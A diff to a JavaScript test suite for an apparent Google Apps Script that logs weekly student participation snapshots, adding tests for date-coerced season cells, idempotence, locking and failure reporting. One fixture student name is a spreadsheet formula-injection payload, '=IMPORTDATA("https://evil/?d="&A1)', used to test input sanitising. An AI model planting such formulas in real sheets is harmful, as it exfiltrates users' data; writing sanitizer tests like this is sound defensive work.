@@ -582,7 +582,7 @@ test('스냅샷 쓰기가 공용 소독 통로를 탄다 — 이름이 «=»로 
 function loadSnapshot() {
   const src = section("const TALK_INDEX_LOG_SHEET = 'talk_index_log'", '/* [v9.99] 학생용 오늘의 만남');
   const names = ['seasonStartOf_', 'seasonWeekOf_', 'seasonLabelOf_', 'SEASON_WEEKS',
-    'ensureSheet', 'quietScoreMap_', 'talkIndexOf_', 'Logger', '행소독_'];
+    'ensureSheet', 'quietScoreMap_', 'talkIndexOf_', 'Logger', '행소독_', 'seasonKeyOf_', 'LockService'];
   return (stub) => new Function(...names, `${src}\nreturn talkIndexSnapshot_;`)(...names.map((n) => stub[n]));
 }
 
@@ -594,13 +594,30 @@ function fakeLogSheet() { // 헤더 1행 가정 — data는 2행부터의 실데
   return {
     data: [],
     raw: [],   // Sheets 에 «건넨» 원본 — 저장 후엔 아포스트로피가 소비돼 안 보이므로 따로 잡아 둔다
+    텍스트열: {},  // 1-기반 열 번호 → 1 (setNumberFormat('@') 로 못박은 칸)
     getLastRow() { return this.data.length + 1; },
+    getMaxRows() { return this.data.length + 1000; },
+    /* 🔑 실제 Sheets 는 «자동» 서식 칸에 들어온 'yyyy-MM-dd' 문자열을 **Date 로 삼킨다** — 텍스트(@)로
+     *   못박은 칸만 문자열로 남는다. 이걸 안 흉내 내면 멱등 시험이 라이브와 «다른 것»을 잰다:
+     *   08-14 실측에서 이 흉내가 없어 「재실행이 행을 안 늘린다」가 초록인 채 라이브만 중복 적재였다. */
+    삼킴(v, 열) {
+      if (this.텍스트열[열]) return v;
+      if (typeof v === 'string' && /^\d{4}-\d{2}-\d{2}$/.test(v)) {
+        const d = new Date(v + 'T00:00:00');
+        if (!isNaN(d.getTime())) return d;
+      }
+      return v;
+    },
     getRange(r, c, n, w) {
       const self = this;
       return {
         getValues() { return self.data.slice(r - 2, r - 2 + n).map((row) => row.slice(c - 1, c - 1 + w)); },
+        setNumberFormat(f) { if (f === '@') for (let i = 0; i < (w || 1); i++) self.텍스트열[c + i] = 1; },
         setValues(v) {
-          v.forEach((row, i) => { self.raw.push(row.slice()); self.data[r - 2 + i] = row.map(저장); });
+          v.forEach((row, i) => {
+            self.raw.push(row.slice());
+            self.data[r - 2 + i] = row.map((cell, j) => self.삼킴(저장(cell), c + j));
+          });
         }
       };
     }
@@ -615,8 +632,13 @@ function snapshotRig() {
   };
   const log = fakeLogSheet();
   let ensureCalls = 0, capturedHeaders = null;
+  const 잠금 = { 잡음: 0, 품: 0 };
+  const 받은when = [];
   const rig = {
     log,
+    잠금,
+    받은when,                        // talkIndexOf_ 가 실제로 받은 «잰 시각» — 분모 판정의 재료
+    던질반: null,                    // 이 반에서 talkIndexOf_ 가 터진다(실패 격리·보고 시험)
     ensureCalls: () => ensureCalls,
     headers: () => capturedHeaders,
     ss: { getSheetByName: (n) => (n === 'profiles' ? pfSheet : null), getSpreadsheetTimeZone: () => 'Asia/Ulaanbaatar' },
@@ -627,12 +649,18 @@ function snapshotRig() {
       SEASON_WEEKS: G.SEASON_WEEKS,
       ensureSheet: (ss2, name, headers) => { ensureCalls++; capturedHeaders = headers; return log; },
       quietScoreMap_: () => ({}),
-      talkIndexOf_: () => [
+      /* 실물과 같은 규약(엔진_셋업확장.js:1545) — Date 든 굳은 텍스트든 'yyyy-MM-dd' 한 글자로 접는다. */
+      seasonKeyOf_: (v) => (v instanceof Date && !isNaN(v.getTime())
+        ? [v.getFullYear(), String(v.getMonth() + 1).padStart(2, '0'), String(v.getDate()).padStart(2, '0')].join('-')
+        : String(v == null ? '' : v).trim()),
+      LockService: { getScriptLock: () => ({ waitLock() { 잠금.잡음++; }, releaseLock() { 잠금.품++; } }) },
+      talkIndexOf_: (ss2, cN, when) => (받은when.push(when), rig.던질반 === cN
+        ? (() => { throw new Error('groups 읽기 실패(흉내)'); })() : [
         // 첫 학생 이름은 폼에서 온 「남의 글」 — 상담시트에 이렇게 적히면 profiles→groups 를 거쳐 그대로 흘러온다
         { sid: 'S1', name: '=IMPORTDATA("https://evil/?d="&A1)', grp: 1, got: 3, max: 6, quiet: 0, pct: 50 },
         { sid: 'S2', name: '사란', grp: 1, got: 6, max: 6, quiet: 0, pct: 100 },
         { sid: 'S9', name: '신입', grp: 1, got: 0, max: 0, quiet: 0, pct: 0 } // 아직 잴 차시 없음 — 행 금지
-      ],
+      ]),
       Logger: { log() {} },
       // 실물과 같은 규약(Code.js 행소독_ → 셀안전_): 문자열만 소독, Date·number 는 타입 보존
       행소독_: (rows) => rows.map((r) => r.map((v) =>
@@ -666,4 +694,68 @@ test('시즌 미설정이면 시트를 만들지도 쓰지도 않는다 (개원 
   const out = loadSnapshot()(rig.stub)(rig.ss);
   assert.ok(out.includes('적재 없음'), '시즌 미설정인데 적재를 시도한다: ' + out);
   assert.equal(rig.ensureCalls(), 0, '시즌 미설정인데 시트를 만들었다');
+});
+
+/* ── [vNEXT] ①배포 검수 P1 6건 처분 — 전부 «라이브에서만 참»이라 옛 회귀가 못 봤다 ────────────
+ * 08-14 실측: 코드가 라이브에 나간 뒤 GPT 배포 검수가 6건을 냈고 하나도 오탐이 아니었다.
+ * 공통 급소는 「가짜 시트가 라이브보다 착하다」였다 — 아래 첫 시험이 그 흉내를 실물 쪽으로 당긴다. */
+
+test('🔴 시즌 칸을 시트가 «날짜로 삼켜도» 멱등이다 — 안 접으면 재실행마다 같은 주차가 통째로 쌓인다', () => {
+  const rig = snapshotRig();
+  /* 이미 라이브에 들어가 Date 로 굳은 옛 행을 심는다(자동 서식 칸에 'yyyy-MM-dd' 를 쓰면 이렇게 된다).
+   *   옛 판은 String(Date) = 'Mon Jan 04 2027…' 과 '2027-01-04' 를 대조해 **영영 안 맞았다.** */
+  rig.log.data.push([new Date(), new Date('2027-01-04T00:00:00'), 2, '평일11A', 'S1', '바트', 3, 6, 0, 50]);
+  const out = loadSnapshot()(rig.stub)(rig.ss);
+  assert.ok(out.includes('신규 1행') && out.includes('중복 스킵 1행'),
+    '날짜로 굳은 기존 행을 못 알아봐 중복 적재했다: ' + out);
+  assert.equal(rig.log.data.length, 2, '행이 늘었다 — 멱등이 깨졌다: ' + rig.log.data.length);
+});
+
+test('🔴 시즌 칸을 텍스트로 못박고 쓴다 — 읽기 정규화만으론 «새 행»이 계속 날짜로 굳는다', () => {
+  const rig = snapshotRig();
+  loadSnapshot()(rig.stub)(rig.ss);
+  assert.ok(rig.log.텍스트열[2], '시즌 칸(B열)을 텍스트로 안 박았다 — 다음 적재도 날짜로 삼켜진다');
+  assert.equal(typeof rig.log.data[0][1], 'string',
+    '저장된 시즌 칸이 문자열이 아니다 — 시트가 삼켰다: ' + Object.prototype.toString.call(rig.log.data[0][1]));
+});
+
+test('🔴 분모는 «끝난 차시»까지다 — 월요일 07시 적재가 그날 수업을 미리 세면 안 된다', () => {
+  const rig = snapshotRig();
+  const 월요일아침 = new Date(2027, 0, 11, 7, 0, 0);
+  loadSnapshot()(rig.stub)(rig.ss, null, 월요일아침);
+  assert.ok(rig.받은when.length, 'talkIndexOf_ 를 아예 안 불렀다');
+  const w = rig.받은when[0];
+  assert.ok(w instanceof Date, '잰 시각을 Date 로 안 넘겼다');
+  assert.equal(w.getDate(), 10, '잰 시각이 실행일(11일) 그대로다 — 안 한 월요일 차시가 분모에 든다: ' + w);
+  assert.ok(w < 월요일아침, '잰 시각이 실행 시각보다 앞이 아니다');
+});
+
+test('🔴 반 하나가 터져도 조용히 넘어가지 않는다 — 그 반 학생 전원이 스냅샷에서 빠진다', () => {
+  const rig = snapshotRig();
+  rig.던질반 = '평일11A';
+  const out = loadSnapshot()(rig.stub)(rig.ss);
+  assert.ok(/실패 반 1개/.test(out), '실패를 요약이 안 말한다 — 배치는 성공으로 보고된다: ' + out);
+  assert.ok(out.includes('평일11A'), '어느 반이 빠졌는지 안 말한다 — 이름이 없으면 손이 못 간다: ' + out);
+  assert.equal(rig.log.data.length, 0, '터진 반의 행이 어딘가에서 만들어졌다');
+});
+
+test('🔴 읽기·검사·쓰기를 락으로 감싸고, 터져도 반드시 푼다', () => {
+  const rig = snapshotRig();
+  loadSnapshot()(rig.stub)(rig.ss);
+  assert.equal(rig.잠금.잡음, 1, '스크립트 락을 안 잡는다 — 겹쳐 돌면 같은 키가 나란히 붙는다');
+  assert.equal(rig.잠금.품, 1, '락을 안 풀었다');
+
+  const rig2 = snapshotRig();
+  rig2.stub.ensureSheet = () => { throw new Error('시트 보장 실패(흉내)'); };
+  assert.throws(() => loadSnapshot()(rig2.stub)(rig2.ss), /시트 보장 실패/);
+  assert.equal(rig2.잠금.품, 1, '락 «안»에서 터졌는데 안 풀었다 — 다음 실행이 30초를 통째로 기다리다 죽는다');
+});
+
+test('🔴 주간 리포트는 «마지막 물리 행»을 이번 주로 삼지 않는다 — 낡은 기록과 「기록 없음」은 다른 상태다', () => {
+  const wr = section('function weeklyReport(', '\n}');
+  const 꼬리 = wr.slice(wr.indexOf('TALK_INDEX_LOG_SHEET'));
+  assert.ok(!/rowsT\[rowsT\.length - 1\]/.test(꼬리),
+    '마지막 물리 행을 이번 주로 삼는다 — 이번 주 0행이면 지난주 숫자를 이번 주라고 보고한다');
+  assert.ok(/seasonWeekOf_\(/.test(꼬리), '현재 주차를 «지금»에서 계산하지 않는다');
+  assert.ok(/seasonKeyOf_\(/.test(꼬리), '시즌 칸을 접어 읽지 않는다 — 시트가 날짜로 삼킨 행이 대조에서 빠진다');
 });
